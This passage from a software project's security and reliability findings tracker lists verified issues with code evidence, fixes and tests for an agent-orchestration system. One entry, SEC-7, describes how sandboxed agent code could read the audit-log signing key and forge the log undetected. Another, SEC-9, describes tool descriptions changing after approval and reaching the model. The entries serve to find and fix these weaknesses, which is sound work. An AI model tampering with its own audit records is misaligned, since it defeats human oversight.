  2. Handle JSON-escaped line breaks (`\n` inside a quoted value) as part of a held value for PEM-in-JSON, keyed off the PEM header hold that already exists (_PEM_HOLD_RE).
  3. Document the bound and the fail-closed behaviour in security.md's XPIA/streaming section and record the latency decision (upstream #17115).
  4. Keep the final full-text pass on persisted copies unchanged.
- **Done when:** A property-style unit test (seeded RNG, no sleeps) over anchors {password=, "client_secret": ", api_key: , Authorization: Bearer , token=} x lengths {100, 600, 3000, 6000} x chunk sizes {1, 7, 64, 300}. It asserts that no 24-char window of the secret appears in the concatenated feed()+flush() output, and that a non-secret text round-trips unchanged. A second case asserts zero PEM body lines leak for the service-account JSON fixture.
- **Upstream:** #17115 (state unverified)
- **Changed from the source claim:** Constants confirmed and leakage measured (the source confirmed constants only). Narrowed: Bearer and JWT anchors are already fail-closed. Widened: PEM-in-JSON leaks below the 512 bound. Corrected direction: model output -> live surfaces, not 'to the model'. Severity assigned 35.
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:Part3(#17115)

### SEC-7 [35, default, effort L] SEL audit chain forgeable by in-sandbox code — CONFIRMED
- **Verified claim:** Demonstrated in a throwaway home. trust/sel_hmac.key is a VISIBLE (read-write) crew leaf, so a child spawned through sandbox.wrap_argv reads all 32 key bytes at BOTH the standard and the strict tier. With those bytes, an actor that can write security_events.jsonl (also VISIBLE) can delete an entry and recompute prev_hash/entry_hash with HMAC-SHA256 over json.dumps(record, sort_keys=True). verify_integrity() then reports the forged log as fully valid ((2, 2), history_verifiable=True), with no signal that a record was removed. This adds NOTHING beyond the residual AGENTS.md already acknowledges ('sel_hmac.key is VISIBLE, so the SEL audit key has no OS fence; closing that means moving its in-sandbox reader behind the gateway') and sel.md records, including the wider impact: the same key derives the session_pid sidecar MAC subkey, so compromise also mints session identities (issue #302). The ENFORCED-harness credential mask (_CREW_CHILD_WITHHELD_LEAVES) withholds it from foreign harness children, as the claim notes.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/sandbox.py:745-765 _CREW_SANDBOX_VISIBLE_LEAVES — `"trust", "sel_hmac.key", "security_events.jsonl", "security_events.d"` ('verify_session_pid reads trust/sel_hmac.key inside the sandbox')
  - src/kiro_crew/sandbox.py:800-806, 821-831 — _CREW_CHILD_WITHHELD_LEAVES carries trust/sel_hmac.key and cites the AGENTS.md residual
  - src/kiro_crew/sel.py:2381-2386 _compute_hash — `hmac.new(self._hmac_key, json.dumps(d, sort_keys=True).encode(), hashlib.sha256)`
  - src/kiro_crew/sel.py:2794-2830 _verify_file — validates prev_hash linkage + HMAC only; no external anchor or count
  - ran: standard-tier and strict-tier sandboxed child both read key bytes = 32
  - ran: before forge verify_integrity() -> (3, 3); after dropping the 'denied' row and re-signing -> (2, 2), SelVerification(history_verifiable=True, reason='')
  - docs/system-specs/modules/sel.md:51 'Residual: the key still lives in the agent's home namespace — a deeper out-of-process signer is future hardening'; :55-69 session_pid_sig dependency (#302)
  - AGENTS.md 'Security invariants' keystone bullet: sel_hmac.key VISIBLE residual
- **Checked by:** ran-new-script
- **Required outcome:** No in-sandbox process holds the SEL signing key. The in-sandbox readers (verify_session_pid's strict identity resolution, the in-sandbox MCP servers' direct appends) obtain signatures and identity answers from the gateway, so the key can become HIDDEN. session_pid_sig is treated as a dependent of equal weight. This follows AGENTS.md's stated direction, never another matcher or a pattern fence.
- **Solution:**
  1. Track as the existing out-of-process-signer work (sel.md:51, :69; upstream #302). Do not open a parallel item.
  2. Route in-sandbox SEL appends through a gateway endpoint (the in-sandbox MCP servers already authenticate back via .local_secret) and have the gateway sign.
  3. Move every in-sandbox reader of the key behind the same gateway call: verify_session_pid's MAC check AND session_token_sig's per-session token verification (session_token_sig.py:375-395, whose subkey derives from sel_hmac.key).
  4. Only then hide the KEY: split trust/sel_hmac.key (plus the legacy top-level sel_hmac.key leaf) out of the VISIBLE 'trust' leaf (sandbox.py:745-765) into its own HIDDEN entry. Do not hide the whole trust/ directory: skill_search reads trust/project-skills.json in-sandbox (sandbox.py:752, skill_trust.py:15) and fails closed to 'nothing trusted' without it, which would silently stop trusted project skills — a mask wider than the threat this item names. Keep test_sandbox_governance_mask.py's union pin green.
  5. Optional, independent: an operator-configured append-only forward sink (sel.md's SEL Forward Callback) as the detection control for truncation.
- **Done when:** A test spawns a reader through sandbox.wrap_argv at the standard tier and asserts open(trust/sel_hmac.key) fails. The existing session_pid strict-identity tests and an in-sandbox SEL append test still pass through the gateway path, and test_sandbox_governance_mask.py still pins the disposition union.
- **Upstream:** #302 (state unverified)
- **Changed from the source claim:** Verified by demonstration (the source was [VERIFY]). It adds nothing beyond the acknowledged AGENTS.md/sel.md residual: the key is readable at strict as well as standard, and the session-identity impact is already recorded. Severity assigned 35 (needs a prompt-injected agent with shell; detection-only control).
- **Second reader:** security-rules check: corrected. Outcome and direction comply (acknowledged residual, reader moved behind the gateway, no matcher). But solution step 4 moves the whole trust/ leaf to HIDDEN after relocating only the SEL-append and verify_session_pid readers: trust/ also holds project-skills.json, read in-sandbox by skill_search (sandbox.py:752; skill_trust.py fails closed to 'nothing trusted'), and session_token_sig verifies with the same key. Hiding trust/ wholesale is a mask wider than the threat named (AGENTS.md: never tighten a fence past the threat the change names) and silently breaks skill trust in the sandbox.
- **Sources:** verification_needed:V-3

### REL-16 [35, armed, effort M] Opt-in pooled kirocrew-core runs one tool call at a time; ping/initialize skip the queue — PARTLY
- **Original claim:** Pooled kirocrew-core backend runs tools one at a time (corrected below)
- **Verified claim:** Head-of-line blocking is real when sharing is on: every Crew stdio MCP server, including kirocrew-core, runs through run_mcp_stdio_loop, which executes at most one tools/call at a time and queues later ones FIFO; with mcp_gateway.enabled (default False) sessions with an identical server config share one kirocrew-core backend (UNPOOLABLE_SERVERS is empty), so one session's long call — e.g. the core `wait` tool, up to WAIT_TOOL_MAX_SECS = 1800 s — delays every other session's core tool calls. Because ping, initialize and tools/list are answered inline while a call runs, a ping-based liveness check does see the backend as healthy. Not reproduced here: the claim that NEW sessions then time out on session/new — initialize/tools/list are not queued behind the busy call in this loop, so that symptom needs a live pooled repro.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_shared.py:1508 — '# In-flight tool execution state: at most one at a time (sequential dispatch).'; :1526 `_pending_calls: collections.deque` ('tools/call requests received while a worker was busy, dispatched FIFO')
  - src/kiro_crew/mcp_shared.py:1828-1870 and :2245/:2273 (reader loop while a worker is busy) — initialize / tools/list (`respond(req_id, {"tools": ...})`) / ping (`respond(req_id, {})`) answered inline; tools/call goes to the single worker
  - src/kiro_crew/mcp_core.py:2750-2765 run_mcp_core_server -> run_mcp_stdio_loop('kirocrew-core', ..., advertise_caller_identity=...) ('safe to share one backend across sessions')
  - src/kiro_crew/mcp_gateway/rewriter.py:203 `UNPOOLABLE_SERVERS: frozenset[str] = frozenset()`
  - src/kiro_crew/config/integration_sections.py:318-328 McpGatewayConfig.enabled default=False ('Off, every session gets its own backend')
  - src/kiro_crew/constants.py:1616 `WAIT_TOOL_MAX_SECS = 1800`
- **Checked by:** read
- **Required outcome:** With MCP backend sharing on, one session's long-running core tool call never delays another session's core tool calls; a pooled backend that multiplexes callers either dispatches tools/call concurrently per caller or long-blocking tools (wait) are not served from the shared backend.
- **Solution:**
  1. Short term: add kirocrew-core's long-blocking tools to a per-session lane — either list kirocrew-core (or just its `wait` tool) as unpoolable in rewriter.UNPOOLABLE_SERVERS (rewriter.py:203), or have gatewayd route `wait` to a connection-private backend.
  2. Longer term: let run_mcp_stdio_loop (mcp_shared.py:1508) run up to N concurrent workers keyed by caller identity (one in-flight call per caller, FIFO per caller), keeping cancellation per req id.
  3. Update docs/architecture/mcp.md (statelessness/pooling) in the same commit; MCP tools must stay stateless.
- **Done when:** Test: drive run_mcp_stdio_loop with an in-memory stdin/stdout pair and a fake _call_tool where caller A's call blocks on a threading.Event; send caller B's call; assert B's response is written before A's Event is set (bounded wait on B's response, no sleeps).
- **Upstream:** #17031 (state unverified)
- **Changed from the source claim:** Mechanism confirmed in code (sequential dispatch + pooled core); the session/new timeout symptom is not explained by this loop (initialize/tools/list/ping bypass the queue) and was not reproduced.
- **Sources:** verify_needed:G14(#17031)

### REL-32 [35, armed, effort S] Pooled backends orphaned across gatewayd death — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): 01bd8ae8d: mcp_gateway/manager.py now calls `_reap_orphaned_backends()` on the daemon-exited-on-its-own path before respawn   Reap is on the own-death branch as the finding requires
- **Verified claim:** Pooled MCP backends are spawned as their own session leaders and gatewayd persists their pids to a `<socket>.backends` sidecar so a supervisor can killpg them, but the manager reaps that sidecar ONLY inside _terminate_process after a SIGTERM->SIGKILL escalation (the zombie-probe branch). When gatewayd dies on its own (crash, OOM-kill, external SIGKILL — the watchdog's 'daemon exited rc=...' branch), the manager just backs off and respawns without calling _reap_orphaned_backends, and the new daemon rewrites the same sidecar path with its own pids, losing the old ones. Backends that exit on stdin EOF (Crew's own run_mcp_stdio_loop does) self-terminate; third-party servers that do not are orphaned. Scope: armed (mcp_gateway.enabled, default False).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_gateway/manager.py:1660-1666 — inside _terminate_process after SIGKILL: 'SIGKILL skips gatewayd's pool.shutdown_all(), so its pooled MCP backends (each a session leader via start_new_session) reparent to init and leak. Reap the pgids gatewayd persisted out-of-band.' `await self._r…
  - src/kiro_crew/mcp_gateway/manager.py:1394-1396 — `if wait_task in done: rc = wait_task.result(); exit_reason = f"daemon exited rc={rc}"` then :1433-1440 log and `await asyncio.sleep(backoff)` -> respawn, no reap
  - src/kiro_crew/mcp_gateway/pool.py:595-612 — backend pids (pooled, draining, exclusive) persisted 'so a supervising manager can killpg these survivors'
  - src/kiro_crew/mcp_gateway/gatewayd.py:757 `backends_pidfile=Path(f"{socket_path}.backends")` (same path each incarnation); :879-882 unlinked only on clean shutdown
- **Checked by:** read
- **Required outcome:** Whenever gatewayd stops without a clean pool shutdown — killed by the manager OR dead on its own — the pooled backends it recorded are reaped before (or as) a successor daemon starts, and the successor never overwrites an unreaped sidecar.
- **Solution:**
  1. Read docs/system-specs/modules/runtime-ownership.md first (a new kill path). 1. In the manager watchdog's 'daemon exited' branch (manager.py:1394) call `await self._reap_orphaned_backends()` before the respawn sleep, guarded by the same session-leader/identity checks the reaper uses. 2. Alternatively/also, at gatewayd startup (gatewayd.py ~757) read an existing `.backends` sidecar from a previous incarnation and reap those pids before writing its own (verify each pid's start identity so a recycled pid is never signalled). 3. Document in docs/architecture/mcp.md.
- **Done when:** Test with a fake process/wait seam: the manager watchdog observes the daemon exit with rc=-9 while a `<socket>.backends` file lists pid 4242; assert platform_compat.kill_process_tree_async is called with 4242 (stubbed) before the next _spawn_once, and the sidecar is removed.
- **Upstream:** #17153 (state unverified)
- **Changed from the source claim:** Narrowed: reap exists for the manager-SIGKILL path; the gap is self-death of gatewayd. EOF-respecting stdio servers exit by themselves.
- **Sources:** verify_needed:G30(#17153)

### SEC-9 [35, armed, effort M] No MCP tool-schema pinning after 'Trust this tool' — CONFIRMED

> **COMPLETED** — fixed on `main` in `4c8b7b8` (`fix/mcp-tool-drift-pin`): per-tool sha256 digests over (name, description, inputSchema) recorded to `tool-digests.json` beside the launch approvals (same read-only-in-sandbox dir), compared on every complete tools/list off the event loop; drift surfaces as an SEL event + warning — served, not withheld (block remains an owner opt-in); partial listings skipped; non-stubbed servers documented out of scope. mcp.md + security.md updated in-commit.
- **Verified claim:** There is no pinning of an MCP server's advertised tool descriptions or input schemas. The only content-bound approval is mcp_gateway/launch_approval.py, which fingerprints the resolved command+args (hash_command) and the declared env (hash_declared_env) of a stubbed server's LAUNCH. A server whose launch is unchanged can change what its tools say or accept, and that reaches the model without re-approval. This includes `npx pkg@latest`-style launches whose argv hash never changes while the code does. The gateway fans out `notifications/tools/list_changed` to every stub. Persistent tool trust is name-based: ACP `allow_always` (kept by the harness) and Crew `auto_approve_tools` globs. A repo-wide search for schema/description hash, digest, drift or fingerprint found nothing. Crew can only observe tools/list for gateway-stubbed servers (backend.py records what each stub is told its tools are). Per-session servers launched directly by kiro-cli are outside Crew's view.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/mcp_gateway/launch_approval.py:1-35 — approval binds 'hash_command over the resolved command and args, and hash_declared_env over the declared env'
  - src/kiro_crew/mcp_gateway/backend.py:266 — `"notifications/tools/list_changed"` in the global broadcast set; :2724-2727 'e.g. tools/list_changed — safe to fan out to all stubs'
  - src/kiro_crew/mcp_gateway/backend.py:3872-3880 — tools/list results are observed per stub (projection recorded) but not compared to an approved digest
  - src/kiro_crew/acp/_dispatch.py:1258, 1277, 1671-1692 — `allow_always` option kind, name-keyed
  - src/kiro_crew/hooks.py:375-392 — auto_approve_tools glob grants by title/name
  - grep -i 'schema.?(hash|digest|pin|drift)|description.?(hash|digest|drift)|tool.?(hash|fingerprint|digest)' over src/kiro_crew: no tool-definition pinning
- **Checked by:** read
- **Required outcome:** For MCP servers whose traffic passes through Crew's gateway (stubbed/pooled servers), a change to a previously approved tool's description or inputSchema is detected and surfaced to the operator, and is not silently served to the model under the old trust. For servers kiro-cli talks to directly, the limit is documented: Crew has no observation point, so pinning there is kiro-cli's concern. Whether drift BLOCKS (re-prompt) or only WARNS is an operator/security-owner decision, because blocking can strand a working server after a benign update.
- **Solution:**
  1. In mcp_gateway/backend.py where tools/list results are projected per stub (around 3872), compute a per-(server, tool) digest over (name, description, inputSchema) using the same canonical-JSON hashing as mcp_gateway/hashing.py.
  2. Store the operator-approved digests next to the launch approvals (mcp-launch-approvals/, a gateway-written, read-only-in-sandbox leaf), recorded at the moment the operator enables the server.
  3. On mismatch, emit an SEL event and a dashboard notice. Under the owner's chosen policy, either keep serving and warn, or withhold the drifted tool until re-approved through Settings → MCP Management.
  4. Document in security.md (MCP section) and mcp.md that `tools/list_changed` and package-floating launches (`@latest`) are the drift vectors, and that non-stubbed servers are out of scope.
- **Done when:** A gateway backend unit test with a fake MCP server first answers tools/list with tool T (description D1), which is recorded as approved, then answers with D2 after `notifications/tools/list_changed`. It asserts an SEL drift event naming the server and tool and, under the 'block' policy, that T is absent from the listing forwarded to the stub. No real processes or network.
- **Changed from the source claim:** The source was '[VERIFY] - no evidence found'; the search was done and the absence confirmed. Narrowed: Crew can only pin servers routed through its gateway. Severity assigned 35 (armed: needs a third-party MCP server the operator approved; tool output is already treated as untrusted by XPIA hardening, but descriptions arrive as trusted tool definitions).
- **Second reader:** security-rules check: agreed.
- **Sources:** verification_needed:V-5

### REL-14 [30, default, effort S] taskq_fail announces refusal before its store write lands — CONFIRMED

> **PARTIAL (progress)** — loop side done: `spawn_async` awaits the owed `taskq_fail_async` before it returns a refusal (`subagent.py`, `taskq_bridge.py`). Test: `test_a_loop_refusal_is_answered_only_after_its_failed_write_commits`. Tests added: `test_a_refusal_whose_write_retries_is_answered_after_the_retry_commits` (done-when a) and `test_a_refusal_the_store_never_commits_is_tombstoned_not_dispatched` (tombstone set; the pump and `reconcile_on_boot` consult it). Still open: a direct assertion that a pump drain and `reconcile_on_boot` never dispatch the tombstoned row.
- **Verified claim:** SpawnAdmissionCoordinator.taskq_fail posts one best-effort store.finish(FAILED) to the store's writer thread (or runs it inline off-loop) and returns None; a TaskStoreUnavailable (locked/unwritable DB, full disk, network FS) is swallowed at debug, and a process exit before the writer drains loses it. All five gate.py callers then return _announce_rejection unconditionally. The row is left in whatever active state it had: QUEUED for a spawn_async-accepted, unclaimed row (comment: 'a row left queued would run once admission reopens'), ADMITTED for a pump-drained row; reconcile_on_boot transitions ADMITTED -> QUEUED ('lost_owner') and leaves QUEUED queued, so the pump can dispatch work whose caller was told it was refused. Both 'claimed' and 'admitted' readings in the sources describe real cases.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/subagent_manager/admission/taskq_bridge.py:1192-1201 — `def taskq_fail(...) -> None: ... self._post_store_write(store, f"fail {agent_id}", store.finish, agent_id, _taskq.FAILED, error=reason)`
  - src/kiro_crew/subagent_manager/admission/taskq_bridge.py:1089-1133 _post_store_write — 'Run a best-effort store write whose result nothing waits for'; inline path `except _taskq.TaskStoreUnavailable: _glue_logger.debug(...)`; posted path same at debug
  - src/kiro_crew/subagent_manager/admission/gate.py:385, :402, :858, :891, :1238 — taskq_fail(...) immediately followed by `return self._manager._announce_rejection(...)`
  - src/kiro_crew/subagent_manager/admission/gate.py:381-384 comment — 'The caller is told it was refused, so the store is told the same: a row left queued would run once admission reopens.'
  - src/kiro_crew/taskq/reconcile.py:139-144 — `if rec.state == ADMITTED: ... store.transition(rec.id, QUEUED, detail={"reconciled": "lost_owner"})`
  - src/kiro_crew/taskq/store.py:233 TaskStoreUnavailable — 'locked or unwritable database ... or a full disk'
- **Checked by:** read
- **Required outcome:** A spawn refusal is announced only after the store has durably recorded the row as terminal FAILED, or, if that write cannot commit, the refusal path leaves a durable marker that the pump and reconcile_on_boot treat as terminal so refused work never runs later.
- **Solution:**
  1. Add `async def taskq_fail_async(agent_id, reason) -> bool` in taskq_bridge.py next to :1192 that awaits the posted store.finish and returns whether it committed (retry once on TaskStoreUnavailable).
  2. Make the five gate.py callers (:385, :402, :858, :891, :1238) await it before _announce_rejection; on False, log at WARNING and record the refusal in-memory (manager._agents terminal record already exists) AND write a tombstone the pump re-checks before dispatch.
  3. In reconcile_on_boot (taskq/reconcile.py:139), consult that tombstone/terminal event before requeueing an ADMITTED row.
  4. Update docs/system-specs/modules/subagent.md (taskq section) in the same commit.
- **Done when:** Test: a TaskStore whose finish raises TaskStoreUnavailable once, then succeeds; drive the admission-closed refusal (gate.py:385 path) and assert (a) the announcement happens only after the retry committed, and (b) with finish raising permanently, a subsequent pump drain / reconcile_on_boot over that store never dispatches the row (assert dispatch callback not called, row ends FAILED or stays tombstoned).
- **Upstream:** #17397 (state unverified)
- **Changed from the source claim:** none (both CLAIMED/ADMITTED and QUEUED variants exist depending on caller)
- **Sources:** verify_needed:G12(#17397), verification_needed:Part3(#17397)

### REL-24 [30, default, effort S] Cron-store saves are not crash-durable — CONFIRMED

> **COMPLETED** — covered by open upstream PR #16859 ("make cron store writes crash-durable", open); not duplicated.
- **Verified claim:** CronService._save writes the whole cron store with atomic_write(self._path, document) using atomic_write's default fsync=False and never fsyncs the parent directory, so the temp-file-plus-rename is atomic against a PROCESS crash but not durable against an OS crash or power loss: the rename can reach disk before the data, leaving an empty/stale jobs file or losing the last job-state change. A gateway process crash alone does not lose state (page cache survives). Other stores in the same tree already pass fsync=True (chat_persistence, crew_teams, crew_log, session_storage manifests).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/cron.py:4874 _save — `from kiro_crew.atomic_write import atomic_write` / :4939 `atomic_write(self._path, document)` (no fsync kwarg)
  - src/kiro_crew/atomic_write.py:997-1001 — `def atomic_write(..., fsync: bool = False, ...)`; :1277-1278 `if fsync: os.fsync(fd)`
  - src/kiro_crew/atomic_write.py:424 fsync_dir — 'The half that atomic_write's fsync=True does not cover' (directory entry durability); not called by cron._save
  - durable peers: src/kiro_crew/crew_teams.py:422, dashboard/chat_persistence.py:2383, crew_log/store.py:2606, session_storage.py:2841 — atomic_write(..., fsync=True)
- **Checked by:** read
- **Required outcome:** A cron-store save that has returned survives an OS crash or power loss: after reboot the jobs file is either the previous complete document or the new complete document, never empty or truncated, and the last committed job-state change is present.
- **Solution:**
  1. cron.py:4939 — call atomic_write(self._path, document, fsync=True) and then atomic_write.fsync_dir(self._dir, best_effort=True) (best_effort for filesystems that reject directory fsync, as the helper documents).
  2. Do the same for cron_service/identity.py:339 if that file carries job identity state.
  3. Keep the write off the event loop (the save already runs under the file lock in callers; confirm none is on-loop, since fsync adds latency).
  4. Update docs/system-specs/modules/learn-cron-dashboard.md (cron store durability) in the same commit.
- **Done when:** Unit test with atomic_write.os.fsync and fsync_dir monkeypatched to recorders: CronService._save() (on a tmp KIROCREW_HOME) records one fsync on the temp file descriptor and one fsync_dir on the store directory; existing cron store tests stay green.
- **Upstream:** #16858 PR #16859 (state unverified)
- **Changed from the source claim:** Clarified scope: durability gap is for OS crash/power loss, not a gateway process crash; directory fsync is also missing.
- **Second reader:** random-sample check: agreed.
- **Sources:** verify_needed:G24(#16858), verify_needed:G37

### REL-33 [30, default, effort M] Closed-session crew logs expire at 30 days; team and live-session logs grow unbounded — PARTLY
- **Original claim:** Crew logs grow without bound on disk (corrected below)
- **Verified claim:** 'No retention for any crew log kind' is outdated: CLOSED session crew logs are expired by crew_log.store.sweep_expired on session.archive_retention_days (default 30 days), inside the hourly-throttled archive cleanup. What still grows without bound: (1) crew (team) logs — explicitly never scanned ('nothing in that file says when its history stops being wanted'); (2) any open/long-lived session's log, because segment retention exists only on the reader side and 'No writer rotates yet', so log.jsonl is appended forever while the unit lives; (3) closed session logs on a host where no transcript archive is ever written, since the sweep is only reached from _archive_lines (the rotation/compaction archive path), not from a periodic task. The crew log is on by default (KIROCREW_CREW_LOG unset = on).
- **Evidence (at `397f4be`):**
  - src/kiro_crew/crew_log/store.py sweep_expired — 'Remove CLOSED session logs older than retention_days'; 'Crew logs are out of scope and are never scanned: this walks crew-log/sessions alone'
  - src/kiro_crew/history.py:1080-1133 _cleanup_old_archives -> :1137 _cleanup_expired_crew_logs -> sweep_expired; hourly throttle `if now - _last_cleanup < 3600: return 0`; only caller history.py:1060 at the end of _archive_lines
  - src/kiro_crew/config/sections.py:1957-1958 archive_retention_days default=30
  - docs/system-specs/modules/crew-log-core.md §8 — 'Retention is deleting whole segments off the front ... **No writer rotates yet** -- a writer appends to the newest segment, which is log.jsonl in every crew log today'
  - src/kiro_crew/constants.py:142-149 CREW_LOG_ENV — enabled when 'unset, empty or truthy'; crew_log/emit.py:9 'on by default'
- **Checked by:** read
- **Required outcome:** Every crew-log kind has a bounded on-disk footprint: crew/team logs and long-lived session logs rotate into segments and old segments are pruned by a rule, and the expiry sweep runs on a periodic schedule independent of transcript archiving.
- **Solution:**
  1. Writer-side rotation: in crew_log/writer.py, start a new segment `log.<first_seq>.jsonl` when the active one passes a byte budget (the reader side already handles segments, crew-log-core.md §8).
  2. Segment pruning for crew logs: a maintainer-chosen rule (age of the newest entry in a segment, or a per-unit byte cap) — record it in docs/decisions/ since the spec says crew logs need 'a rule of its own'.
  3. Run sweep_expired from the session cleanup tick (session_cleanup._run_cleanup_ticks) on the same throttle instead of only from _archive_lines.
  4. Pruning deletes history — a take-away change: add a Reader: entry per take-away-changes.md and update crew-log-core.md in the same commit.
- **Done when:** Tests: (a) appending past the byte budget creates log.<n>.jsonl and readers (iter_from/page/resolve) still span both; (b) the pruning rule deletes only front segments and resolve() reports `pruned` for a citation into them; (c) with no archive ever written, a cleanup tick (injected clock) still removes a closed session unit older than the retention.
- **Upstream:** #12624 (state unverified)
- **Changed from the source claim:** Retention exists for closed session logs (30 d default) but is archive-triggered; crew/team logs and live-unit logs remain unbounded (no writer rotation).
- **Sources:** verify_needed:G25(#12624)

### REL-40 [30, default, effort S] Transport prompt timeout floor ignores a lower configured ceiling — CONFIRMED

> **COMPLETED** — verified fixed on `main` by code read (no tests run): f0d269c2b: slack/handler_runtime/inbound.py and dashboard/handlers/taskrunner.py (both auto-turn sites) now use `spawn_guarded_turn`, bounded by agent.chat_turn_timeout_secs   Source-scan guard test not verified
- **Verified claim:** prompt_timeout_for_ceiling returns _DEFAULT_PROMPT_TIMEOUT (14400 s) for any configured ceiling <= 14400, so agent.chat_turn_timeout_secs: 300 still yields a 4 h JSON-RPC prompt wait. This floor is deliberate (docstring: 'a LOWERED turn ceiling is enforced by the dashboard's own deadline'), and that other layer exists — turn_dispatch.spawn_guarded_turn/_bounded_turn and bounded_chat_turn wrap dashboard chat, Slack (gateway.py:8952/:9792), cron-inject, messaging, MCP-app inject and spec_builder turns in asyncio.wait_for(chat_turn_timeout_secs()). But it is not universal: at least the Slack->linked-dashboard-slot inbound turn and the task-runner plan/review auto-turns start `asyncio.create_task(_run_chat(...))` with no ceiling wrapper, and _run_chat applies none itself, so on those paths a lowered ceiling is not honoured and the effective bound is the 4 h transport floor.
- **Evidence (at `397f4be`):**
  - src/kiro_crew/acp/client.py:3067 — `_DEFAULT_PROMPT_TIMEOUT = 14400.0`; :3074-3090 prompt_timeout_for_ceiling — `if configured <= _DEFAULT_PROMPT_TIMEOUT: return _DEFAULT_PROMPT_TIMEOUT`
  - src/kiro_crew/acp/client.py:3093-3130 resolve_prompt_timeout docstring — 'Never returns less than _DEFAULT_PROMPT_TIMEOUT: a LOWERED turn ceiling is enforced by the dashboard's own deadline'
  - src/kiro_crew/dashboard/turn_dispatch.py:79 chat_turn_timeout_secs; :291 _bounded_turn; :413 bounded_chat_turn (`asyncio.wait_for(coro, timeout=timeout)`); :447 spawn_guarded_turn
  - bounded callers: dashboard/chat_handlers.py:1708, chat_runner.py:7122/:7190, handlers/messaging.py:1090, handlers/mcp_apps.py:684, slack/gateway.py:3085/:8952/:9792, apps/builtins/spec_builder/backend/runtime.py:468
  - unbounded callers: src/kiro_crew/slack/handler_runtime/inbound.py:384 `_chat_task = asyncio.create_task(_run_chat(...))`; src/kiro_crew/dashboard/handlers/taskrunner.py:753 and :827 `task = asyncio.create_task(_run_chat(...))`
  - rg 'CHAT_TURN_TIMEOUT|chat_turn_timeout|turn_deadline' in dashboard/chat_runner.py and dashboard/chat.py: no matches (no internal ceiling in _run_chat)
- **Checked by:** read
- **Required outcome:** Every chat-shaped turn honours agent.chat_turn_timeout_secs when it is lowered below 4 h, and the transport floor stays a backstop only for non-chat callers (subagents, review runs) that intentionally share it.
- **Solution:**
  1. Wrap the unbounded _run_chat task starts in the existing helper: slack/handler_runtime/inbound.py:384 and dashboard/handlers/taskrunner.py:753/:827 -> spawn_guarded_turn(state, slot, _run_chat(...)) (or asyncio.create_task(bounded_chat_turn(...)) where the caller owns registration). Audit the remaining direct awaits (chat_runner.py:9380, chat_regenerate.py:654, chat_rewind.py:375, slack/gateway.py:7431, apps/builtins/issue_radar crew_runtime.py:828) and confirm each runs inside an already-bounded task.
  2. Add a guard test that scans src for `create_task(_run_chat(` not inside bounded_chat_turn/spawn_guarded_turn (the repo already pins similar source shapes, e.g. chat_handlers.py:1682).
  3. Optionally log one WARNING at startup when chat_turn_timeout_secs < _DEFAULT_PROMPT_TIMEOUT stating the transport keeps 4 h and the turn layer enforces the lower value.
  4. Update docs/system-specs/modules/acp-client.md / learn-cron-dashboard.md where the ceiling contract is described.
- **Done when:** Test: with chat_turn_timeout_secs monkeypatched to return 0.05 and a fake _run_chat that awaits an asyncio.Event never set, drive the Slack-linked inbound path and the task-runner auto-turn path and assert each task ends with the ceiling's timeout handling within a bounded wait_for in the test (no sleeps), while the transport timeout is untouched; plus the source-scan guard test.
- **Changed from the source claim:** Literal claim holds and the floor is intentional; the answer to the source's own [VERIFY] question is that turn_dispatch does enforce the configured ceiling on most turn paths, but at least three _run_chat entry points bypass it.
- **Sources:** verification_needed:P1-2, verification_needed:refactor(transport-timeout)

### REL-45 [30, default, effort S] augmented_path() re-prepends existing PATH dirs — CONFIRMED

> **COMPLETED** — fixed on `main` in `96f8a14` (`fix/augmented-path-no-reorder`): directories already on the inherited PATH stay in caller order; only missing well-known dirs are prepended (the systemd stale-node reason recorded in acp-client.md); the final list deduped; the interpreter parent stays last.
- **Verified claim:** augmented_path(base_path) unconditionally prepends its well-known dirs (managed playwright bins, ~/.local/bin, ~/.toolbox/bin, ~/.npm-packages/bin, mise shims, ~/.volta/bin, /opt/homebrew/bin, /usr/local/bin, every Node bin dir) ahead of base_path with no de-duplication against it, so a directory the user deliberately placed AFTER a devshell's bin is duplicated and moved in front of it. The result becomes the PATH of the spawned agent runtime (acp/runtime.py:2194, acp/client.py:5113/5208/5345/8644), so a devshell's node/python/etc. is shadowed by Homebrew's or mise's in agent shell commands. (Dirs not already on PATH are also placed first by design; the claim's duplicate-reorder is the specific defect.)
- **Evidence (at `397f4be`):**
  - src/kiro_crew/env.py:774-836 augmented_path — `parts = extra + ([base_path] if base_path else [])` with extra built from _managed_browser_cli_dirs(), _EXTRA_PATH_DIRS and _node_all_bin_dirs; no membership check against base_path
  - src/kiro_crew/env.py:42-50 _EXTRA_PATH_DIRS includes '{home}/.local/bin', '{mise_data}/shims', '/opt/homebrew/bin', '/usr/local/bin'
  - ran rel45_path.py with base '/nix/store/abc-devshell/bin:/usr/local/bin:/opt/homebrew/bin:$HOME/.local/bin:/usr/bin:/bin': /usr/local/bin occurrences=2 first_index=8, /opt/homebrew/bin 2 @7, ~/.local/bin 2 @2, devshell_index=10
  - src/kiro_crew/acp/runtime.py:2194 and src/kiro_crew/acp/client.py:5113, :5208, :5345, :8644 — `env["PATH"] = augmented_path(env.get("PATH", ""))` for the spawned runtime
  - src/kiro_crew/env.py:859 _dedup_dirs exists in the same module but augmented_path does not use it
- **Checked by:** ran-new-script
- **Required outcome:** augmented_path keeps the caller's PATH order for every directory already on it, and only adds well-known directories that are missing; a devshell or virtualenv bin that precedes a system dir in the inherited PATH still precedes it in the agent runtime's PATH.
- **Solution:**
  1. In env.py augmented_path (:774), split base_path into a set (normalised with os.path.normcase/normpath) and drop from `extra` every entry already present before prepending; run the final list through _dedup_dirs.
  2. Decide (and record in docs/system-specs/modules/acp-client.md) whether missing well-known dirs should be prepended or appended; appending them after base_path removes shadowing entirely but is a behaviour change for systemd launches whose base PATH has a stale /usr/bin node — keep prepend for missing dirs if that is the documented reason.
  3. Keep sys.executable's parent last (unchanged).
- **Done when:** Unit test: with HOME pinned to tmp, augmented_path('/devshell/bin:/opt/homebrew/bin:/usr/bin') returns a list in which '/devshell/bin' precedes '/opt/homebrew/bin', each directory appears exactly once, and a well-known dir absent from base (e.g. $HOME/.local/bin) is still present.
- **Upstream:** #17462 (state unverified)
